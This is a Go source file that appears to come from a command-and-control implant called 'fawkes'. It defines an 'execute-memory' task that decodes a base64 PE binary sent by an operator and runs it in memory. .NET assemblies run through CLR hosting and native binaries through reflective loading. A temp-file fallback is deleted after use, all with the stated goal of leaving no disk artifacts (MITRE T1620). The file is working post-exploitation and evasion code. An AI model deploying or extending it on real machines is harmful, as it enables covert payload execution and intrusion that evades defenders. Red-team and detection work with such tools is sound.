//go:build windows

package commands

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"strings"
	"time"

	"fawkes/pkg/structs"
)

// executeMemoryArgs is shared with execute_memory_linux.go and execute_memory_darwin.go
// (duplicated due to build tags).
type executeMemoryArgs struct {
	BinaryB64  string `json:"binary_b64"`  // base64-encoded PE binary
	Arguments  string `json:"arguments"`   // command-line arguments (space-separated)
	Timeout    int    `json:"timeout"`     // execution timeout in seconds (default: 60)
	ExportName string `json:"export_name"` // (Windows DLLs) export function to call after DllMain
}

// ExecuteMemoryCommand executes a PE binary in memory on Windows.
// Automatically detects PE type and selects the best execution method:
//   - .NET assemblies → CLR hosting (inline-assembly path, zero disk artifacts)
//   - Native DLLs → reflective loading (manual PE mapping, zero disk artifacts)
//   - Native EXEs → in-memory PE mapping with IAT hooks (zero disk artifacts)
//   - Fallback → temp file execution if in-memory methods fail
//
// MITRE T1620 — Reflective Code Loading
type ExecuteMemoryCommand struct{}

func (c *ExecuteMemoryCommand) Name() string { return "execute-memory" }
func (c *ExecuteMemoryCommand) Description() string {
	return "Execute a PE binary in memory — auto-detects .NET/native and avoids disk artifacts (T1620)"
}

func (c *ExecuteMemoryCommand) Execute(task structs.Task) structs.CommandResult {
	if task.Params == "" {
		return errorResult("Error: binary_b64 parameter required (base64-encoded PE binary)")
	}

	var args executeMemoryArgs
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return errorf("Error parsing parameters: %v", err)
	}

	if args.BinaryB64 == "" {
		return errorResult("Error: binary_b64 is empty")
	}

	binaryData, err := base64.StdEncoding.DecodeString(args.BinaryB64)
	if err != nil {
		return errorf("Error decoding binary: %v", err)
	}

	if len(binaryData) < 64 {
		return errorResult("Error: binary data too small to be a valid PE")
	}

	if !isValidPE(binaryData) {
		return errorResult("Error: not a valid PE binary (missing MZ/PE signature)")
	}

	timeout := args.Timeout
	if timeout <= 0 {
		timeout = 60
	}

	// Route based on PE type
	if peLoaderIsNETAssembly(binaryData) {
		return executeMemoryNET(binaryData, args.Arguments)
	}

	// Try in-memory execution first (native EXE or DLL)
	output, err := peLoaderExec(binaryData, args.Arguments, timeout, args.ExportName)
	if err == nil {
		if output == "" {
			output = fmt.Sprintf("[+] PE executed in-memory successfully (%d bytes, no output)", len(binaryData))
		}
		return structs.CommandResult{
			Output:    output,
			Status:    "success",
			Completed: true,
		}
	}

	// In-memory failed — fall back to temp file
	return executeMemoryTempFile(binaryData, args.Arguments, timeout,
		fmt.Sprintf("[!] In-memory execution failed (%v), falling back to temp file\n", err))
}

// executeMemoryNET routes .NET assemblies to the CLR hosting path
// via the shared ExecuteNETAssembly helper (defined in inlineassembly.go).
func executeMemoryNET(assemblyBytes []byte, arguments string) structs.CommandResult {
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[*] Detected .NET assembly (%d bytes)\n", len(assemblyBytes)))

	var args []string
	if arguments != "" {
		args = strings.Fields(arguments)
	}

	output, err := ExecuteNETAssembly(assemblyBytes, args)
	if err != nil {
		sb.WriteString(fmt.Sprintf("[!] %v\n", err))
		return structs.CommandResult{
			Output:    sb.String(),
			Status:    "error",
			Completed: true,
		}
	}

	sb.WriteString("[+] .NET assembly executed successfully (zero disk artifacts)\n")
	if output != "" {
		sb.WriteString("\n")
		sb.WriteString(output)
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

// executeMemoryTempFile is the legacy fallback that writes to a temp file.
func executeMemoryTempFile(binaryData []byte, arguments string, timeout int, prefix string) structs.CommandResult {
	tmpFile, err := os.CreateTemp("", "")
	if err != nil {
		return errorf("Error creating temp file: %v", err)
	}
	tmpPath := tmpFile.Name()

	if _, err := tmpFile.Write(binaryData); err != nil {
		tmpFile.Close()
		secureRemove(tmpPath)
		return errorf("Error writing binary: %v", err)
	}
	tmpFile.Close()

	var cmdArgs []string
	if arguments != "" {
		cmdArgs = strings.Fields(arguments)
	}

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(timeout)*time.Second)
	defer cancel()

	cmd := exec.CommandContext(ctx, tmpPath, cmdArgs...)

	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	execErr := cmd.Run()
	secureRemove(tmpPath)

	var sb strings.Builder
	sb.WriteString(prefix)
	if stdout.Len() > 0 {
		sb.WriteString(stdout.String())
	}
	if stderr.Len() > 0 {
		if sb.Len() > 0 {
			sb.WriteString("\n")
		}
		sb.WriteString("[stderr] ")
		sb.WriteString(stderr.String())
	}

	if execErr != nil {
		if ctx.Err() == context.DeadlineExceeded {
			sb.WriteString(fmt.Sprintf("\n[Process timed out after %ds]", timeout))
		}
		output := sb.String()
		if output == "" {
			output = fmt.Sprintf("Error executing binary: %v", execErr)
		}
		return structs.CommandResult{
			Output:    output,
			Status:    "error",
			Completed: true,
		}
	}

	output := sb.String()
	if output == "" {
		output = fmt.Sprintf("[+] Binary executed successfully (%d bytes, no output)", len(binaryData))
	}

	return structs.CommandResult{
		Output:    output,
		Status:    "success",
		Completed: true,
	}
}

// isValidPE is defined in execute_memory_helpers.go (cross-platform)
